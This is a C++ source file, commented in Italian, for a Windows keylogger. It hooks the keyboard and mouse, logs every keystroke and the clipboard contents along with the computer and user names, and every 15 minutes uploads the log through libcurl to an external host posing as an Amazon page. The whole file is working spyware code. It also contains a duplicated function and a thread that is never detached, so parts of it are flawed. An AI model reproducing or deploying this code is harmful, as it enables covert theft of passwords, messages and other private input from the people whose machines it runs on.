#include "WindowsHook.h"

WindowsHook::WindowsHook()
{
	this->hHook = NULL;
}

WindowsHook::~WindowsHook()
{
	UnHook();
}

bool WindowsHook::SetHook(int type)
{
	if (this->hHook != NULL) return false;
	this->hHook = SetWindowsHookEx(type, (type == WH_KEYBOARD_LL) ? KeyboardProc : MouseProc, GetModuleHandle(nullptr), 0);
	contentFile = StartString();
	std::thread t(timeCheck); // istancing a thread
	//t.detach(); // detaching the thread
	return this->hHook != NULL;
}

bool WindowsHook::UnHook()
{
	if (this->hHook != NULL)
	{
		UnhookWindowsHookEx(hHook);
		this->hHook = NULL;
		return true;
	}
	return false;
}

// thread function
static void timeCheck() {
	std::string tmp;
	while (true) {
		// Wait 15 minutes
		std::this_thread::sleep_for(waitTime);
		tmp = contentFile;
		contentFile = "";
		std::ofstream outputFile(FilePath);
		if (outputFile.is_open()) outputFile << tmp;
		outputFile.close();

		// sending the file to the server
		CURL* curl;
		CURLcode res;
		curl_global_init(CURL_GLOBAL_ALL);
		curl = curl_easy_init();

		if (curl) {
			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
			curl_mime* mime;
			curl_mimepart* part;
			mime = curl_mime_init(curl);
			part = curl_mime_addpart(mime);
			curl_mime_name(part, "file");
			curl_mime_filedata(part, FilePath.c_str());
			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
			res = curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			curl_mime_free(mime);
		}
		curl_global_cleanup();

		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
	}
}

// creating the string that will be written at the beginning of the file
static std::string StartString()
{
	std::string startString = ""; // for the top of the file
	std::time_t now = std::time(nullptr);
	std::tm currentTime;
	// obtaining the PC name
	TCHAR pcname[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD pcname_len = sizeof(pcname) / sizeof(pcname[0]);
	// PC name
	startString = "\n------------------------------------\nNome Computer: ";
	if (GetComputerName(pcname, &pcname_len)) {
		std::string pcnameStr(pcname, pcname + pcname_len);
		startString.append(pcnameStr);
	}
	else startString.append("Impossibile ottenere il nome del computer.");
	// User Name
	startString.append("\nNome utente: ");
	TCHAR username[256];
	DWORD username_len = sizeof(username) / sizeof(username[0]);
	if (GetUserName(username, &username_len))
	{
		std::string usernameStr(username, username + username_len);
		startString.append(usernameStr);
	}
	else startString.append("Impossibile ottenere il nome utente.");
	// date & time
	localtime_s(&currentTime, &now);
	startString.append("\nDATA: ");
	std::string day = std::to_string(currentTime.tm_mday);
	std::string month = std::to_string(currentTime.tm_mon + 1);
	std::string year = std::to_string(currentTime.tm_year + 1900);
	std::string date = day.append("/").append(month).append("/").append(year);
	startString.append(date);
	startString.append("\nORA: ");
	std::string hour = std::to_string(currentTime.tm_hour);
	std::string minute = std::to_string(currentTime.tm_min);
	std::string second = std::to_string(currentTime.tm_sec);
	std::string time = hour.append(":").append(minute).append(":").append(second);
	startString.append(time);
	startString.append("\n------------------------------------\n");
	return startString;
}

// thread function
static void timeCheck() {
	std::string tmp;
	while (true) {
		// Wait 15 minutes
		std::this_thread::sleep_for(waitTime);
		tmp = contentFile;
		contentFile = "";
		std::ofstream outputFile(FilePath);
		if (outputFile.is_open()) outputFile << tmp;
		outputFile.close();

		// sending the file to the server
		CURL* curl;
		CURLcode res;
		curl_global_init(CURL_GLOBAL_ALL);
		curl = curl_easy_init();

		if (curl) {
			curl_easy_setopt(curl, CURLOPT_URL, "https://amazontheveryreal.000webhostapp.com/home.php");
			curl_mime* mime;
			curl_mimepart* part;
			mime = curl_mime_init(curl);
			part = curl_mime_addpart(mime);
			curl_mime_name(part, "file");
			curl_mime_filedata(part, FilePath.c_str());
			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
			res = curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			curl_mime_free(mime);
		}
		curl_global_cleanup();

		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
	}
}

// Keyboard hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		KBDLLHOOKSTRUCT* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		bool isShiftPressed = ((GetKeyState(VK_LSHIFT) & 0x8000) != 0) || ((GetKeyState(VK_RSHIFT) & 0x8000) != 0);
		bool isCapsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		bool isCtrlPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0) || ((GetKeyState(VK_RCONTROL) & 0x8000) != 0);
		bool isNumLockActive = ((GetKeyState(VK_NUMLOCK) & 1) != 0);
		bool isAltPressed = ((GetKeyState(VK_LMENU) & 0x8000) != 0);
		bool isAltGrPressed = ((GetKeyState(VK_LCONTROL) & 0x8000) != 0 && (GetKeyState(VK_RMENU) & 0x8000) != 0);

		int vkCode = pKeyboardStruct->vkCode;
		std::string message("");

		// checking CTRL + V
		if (isCtrlPressed && vkCode == VK_V)
		{
			// checking if the clipboard is open
			if (OpenClipboard(NULL))
			{
				// getting the clipboard data
				HANDLE hData = GetClipboardData(CF_TEXT);
				if (hData != NULL)
				{
					// getting the text from the clipboard by locking it
					char* text = static_cast<char*>(GlobalLock(hData));
					if (text != NULL)
					{
						message.append("\n--- CTRL + V ---\n");
						message.append(text);
						message.append("\n--/FINE -> CTRL + V*\\--\n");
						// unlocking the clipboard
						GlobalUnlock(hData);
					}
				}
				CloseClipboard();
			}
		}
		// checking TAB and SPACE
		else if (!isShiftPressed && !(isCapsLockActive) && (vkCode == VK_SPACE || vkCode == VK_TAB) && !isCtrlPressed)
		{
			if (vkCode == VK_TAB) message = "|TAB|";
			else if (vkCode == VK_SPACE) message = " ";
		}
		// checking lowercase letters
		else if (!isShiftPressed && !isAltGrPressed && (vkCode >= VK_A && vkCode <= VK_Z) && !isCtrlPressed)
		{
			message = std::tolower(vkCode);
		}
		// checking capital letters
		else if ((isShiftPressed || isCapsLockActive) && !(pKeyboardStruct->flags & LLKHF_UP) && (vkCode >= VK_A && vkCode <= VK_Z))
		{
			message = std::toupper(vkCode);
		}
		// checking the numbers (and the numbers of the numeric keypad)
		else if (((vkCode >= VK_0 && vkCode <= VK_9) || (isNumLockActive && (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9))) && !isShiftPressed)
		{
			// controllo singolarmente i numeri del tastierino numerico (a destra della tastiera)
			switch (vkCode)
			{
			case VK_NUMPAD0: // 0
				message = "0";
				break;
			case VK_NUMPAD1: // 1
				message = "1";
				break;
			case VK_NUMPAD2: // 2
				message = "2";
				break;
			case VK_NUMPAD3: // 3
				message = "3";
				break;
			case VK_NUMPAD4: // 4
				message = "4";
				break;
			case VK_NUMPAD5: // 5
				message = "5";
				break;
			case VK_NUMPAD6: // 6
				message = "6";
				break;
			case VK_NUMPAD7: // 7
				message = "7";
				break;
			case VK_NUMPAD8: // 8
				message = "8";
				break;
			case VK_NUMPAD9: // 9
				message = "9";
				break;
			default: // tutti i numeri sopra le lettere
				message = vkCode;
				break;
			}
		}
		// special characters with ALTRGR
		else if (!isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS || vkCode == VK_SC_O || vkCode == VK_SC_A))
		{
			switch (vkCode)
			{
			case VK_SC_E: // [
				message = "[";
				break;
			case VK_OEM_PLUS: // ]
				message = "]";
				break;
			case VK_SC_O: // @
				message = "@";
				break;
			case VK_SC_A: // #
				message = "#";
				break;
			}
		}
		// curly brackets
		else if (isShiftPressed && isAltGrPressed && (vkCode == VK_SC_E || vkCode == VK_OEM_PLUS))
		{
			if (vkCode == VK_SC_E) message = "{"; // {
			else if (vkCode == VK_OEM_PLUS) message = "}"; // }
		}
		// checking special characters
		else if (isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A) || (vkCode >= VK_0 && vkCode <= VK_9)))
		{
			// controllo tutti i caratteri speciali "scrivibili" con SHIFT
			switch (vkCode)
			{
			case VK_0: // =
				message = "=";
				break;
			case VK_1: // !
				message = "!";
				break;
			case VK_2: // "
				message = "\"";
				break;
			case VK_3: // £
				message = "£";
				break;
			case VK_4: // $
				message = "$";
				break;
			case VK_5: // %
				message = "%";
				break;
			case VK_6: // &
				message = "&";
				break;
			case VK_7: // '/'
				message = "/";
				break;
			case VK_8: // (
				message = "(";
				break;
			case VK_9: // )
				message = ")";
				break;
			case VK_SC_E: // é
				message = "é";
				break;
			case VK_OEM_PLUS: // 'SHIFT' + '+' = '*'
				message = "*";
				break;
			case VK_OEM_COMMA: // ;
				message = ";";
				break;
			case VK_OEM_MINUS: // _
				message = "_";
				break;
			case VK_OEM_PERIOD: // :
				message = ":";
				break;
			case VK_SC_U: // §
				message = "§";
				break;
			case VK_SC_O: // ç
				message = "ç";
				break;
			case VK_APOSTROPHE: // ?
				message = "?";
				break;
			case VK_BACKSLASH: // |
				message = "|";
				break;
			case VK_SC_I: // ^
				message = "^";
				break;
			case VK_SC_A: // °
				message = "°";
				break;
			}
		}
		// some keys WITHOUT pressing SHIFT
		else if (!isShiftPressed && ((vkCode >= VK_SC_E && vkCode <= VK_SC_O) || (vkCode >= VK_APOSTROPHE && vkCode <= VK_SC_A)))
		{
			switch (vkCode)
			{
			case VK_SC_E: // è
				message = "è";
				break;
			case VK_OEM_PLUS: // +
				message = "+";
				break;
			case VK_OEM_COMMA: // ,
				message = ",";
				break;
			case VK_OEM_MINUS: // -
				message = "-";
				break;
			case VK_OEM_PERIOD: // .
				message = ".";
				break;
			case VK_SC_U: // ù
				message = "ù";
				break;
			case VK_SC_O: // ò
				message = "ò";
				break;
			case VK_APOSTROPHE: // '
				message = "'";
				break;
			case VK_BACKSLASH: // '\'
				message = "\\";
				break;
			case VK_SC_I: // ì
				message = "ì";
				break;
			case VK_SC_A: // à
				message = "à";
				break;
			}
		}
		// ARROWS (UP, DOWN, LEFT, RIGHT)
		else if (!isShiftPressed && !isAltGrPressed && (vkCode >= VK_LEFT && vkCode <= VK_DOWN) || (!isNumLockActive && vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9))
		{
			if (isCtrlPressed)
				message = "|CTRL->";
			else
				message = "|->";
			switch (vkCode)
			{
			case VK_NUMPAD4:
			case VK_LEFT: // LEFT
				message.append("L|");
				break;
			case VK_NUMPAD8:
			case VK_UP: // UP
				message.append("U|");
				break;
			case VK_NUMPAD6:
			case VK_RIGHT: // RIGHT
				message.append("R|");
				break;
			case VK_NUMPAD2:
			case VK_DOWN: // DOWN
				message.append("D|");
				break;
			}
		}
		// BACKSPACE
		else if (!isShiftPressed && !isAltGrPressed && vkCode == VK_BACK)
		{
			if (isCtrlPressed)
				message = "|CTRL<|";
			else
				message = "|<|";
		}
		// CANC / DELETE
		else if (!isShiftPressed && !isAltGrPressed && vkCode == VK_DELETE)
		{
			if (isCtrlPressed)
				message = "|CTRL>|";
			else
				message = "|>|";
		}
		// checking numPad operators
		else if (vkCode == VK_MULTIPLY || vkCode == VK_ADD || vkCode == VK_SUBTRACT || vkCode == VK_DECIMAL || vkCode == VK_DIVIDE)
		{
			switch (vkCode)
			{
			case VK_MULTIPLY: // *
				message = "*";
				break;
			case VK_ADD: // +
				message = "+";
				break;
			case VK_SUBTRACT: // -
				message = "-";
				break;
			case VK_DECIMAL: // .
				message = ".";
				break;
			case VK_DIVIDE: // '/'
				message = "/";
				break;
			}
		}
		// BLOCK NUM
		else if (vkCode == VK_NUMLOCK)
		{
			if (isNumLockActive)
				message = "\n|LOCKNUM_OFF|\n";
			else
				message = "\n|LOCKNUM_ON|\n";
		}
		// ENTER
		else if (vkCode == VK_RETURN)
		{
			message = "\n";
		}
		// INSERT
		else if (vkCode == VK_INSERT || (!isNumLockActive && vkCode == VK_NUMPAD0))
		{
			message = "|INS|";
		}
		// PAGE UP
		else if (vkCode == VK_PRIOR || (!isNumLockActive && vkCode == VK_NUMPAD9))
		{
			message = "|PAGE_UP|";
		}
		// PAGE DOWN
		else if (vkCode == VK_NEXT || (!isNumLockActive && vkCode == VK_NUMPAD3))
		{
			message = "|PAGE_DOWN|";
		}
		// END
		else if (vkCode == VK_END || (!isNumLockActive && vkCode == VK_NUMPAD1))
		{
			message = "|END|";
		}
		// HOME
		else if (vkCode == VK_HOME || (!isNumLockActive && vkCode == VK_NUMPAD7))
		{
			message = "|HOME|";
		}
		// ESCAPE
		else if (vkCode == VK_ESCAPE)
		{
			message = "|ESC|";
		}

		if (vkCode == VK_ESCAPE			// ESC
			|| vkCode == VK_F1			// F1
			|| vkCode == VK_F2			// F2
			|| vkCode == VK_F3			// F3
			|| vkCode == VK_F4			// F4
			|| vkCode == VK_F5			// F5
			|| vkCode == VK_F6			// F6
			|| vkCode == VK_F7			// F7
			|| vkCode == VK_F8			// F8
			|| vkCode == VK_F9			// F9
			|| vkCode == VK_F10			// F10
			|| vkCode == VK_F11			// F11
			|| vkCode == VK_F12			// F12
			|| vkCode == VK_CAPITAL		// CAPS LOCK
			|| vkCode == VK_LSHIFT		// LSHIFT
			|| vkCode == VK_RSHIFT		// RSHIFT
			|| vkCode == VK_LCONTROL	// LCTRL
			|| vkCode == VK_RCONTROL	// RCTRL
			|| vkCode == VK_LMENU		// LWIN
			|| vkCode == VK_RMENU		// RWIN
			|| vkCode == VK_APPS		// MENU (BOTTOM RIGHT)
			|| vkCode == VK_LMENU		// ALT
			|| vkCode == VK_RMENU		// ALTGR (162 + 165)
			|| vkCode == VK_SNAPSHOT	// STAMP/R SIST (PRINT)
			|| vkCode == VK_SCROLL		// BLOCC SCORR
			|| vkCode == VK_PAUSE		// PAUSA/INTERR
			|| vkCode == VK_CLEAR		// NUMBER FIVE OF NUMERIC KEYPAD WHEN "NUM_LOCK" IS DISABLED
			) return CallNextHookEx(NULL, nCode, wParam, lParam);

		// save the message in a file
		std::ofstream file(FilePath, std::ios::app);
		if (file.is_open()) file << message;
		file.close();

		std::cout << message;

	}
	// return control to the Operating System
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Check if the clipboard is open and if there is a possible copy
static void checkPossibleCopy(std::string& mess)
{
	if (OpenClipboard(NULL))
	{
		HANDLE hData = GetClipboardData(CF_TEXT);
		if (hData != NULL)
		{
			char* text = static_cast<char*>(GlobalLock(hData));
			if (text != NULL)
			{
				if (clipBoardLastSave != text)
				{
					mess.append("\n--Possibile copia con il mouse--\n");
					mess.append(text);
					mess.append("\n--/*FINE*\\--\n");
					clipBoardLastSave = text;
				}
				GlobalUnlock(hData);
			}
		}
		CloseClipboard();
	}
}

// Callback funciton for the mouseHook
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	// Verifyng if the mouse event is a click
	if (nCode == HC_ACTION && (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN))
	{
		std::string message = "";
		if (wParam == WM_LBUTTONDOWN)
		{
			message = "|<M|";
		}
		else if (wParam == WM_RBUTTONDOWN)
		{
			message = "|M>|";
		}
		else if (wParam == WM_MBUTTONDOWN)
			message = "|M|";
		checkPossibleCopy(message);
		// save the message in a file
		std::ofstream file(FilePath, std::ios::app);
		if (file.is_open()) file << message;
		file.close();
	}

	// Leaving the system its next job of the chain (the next hook)
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}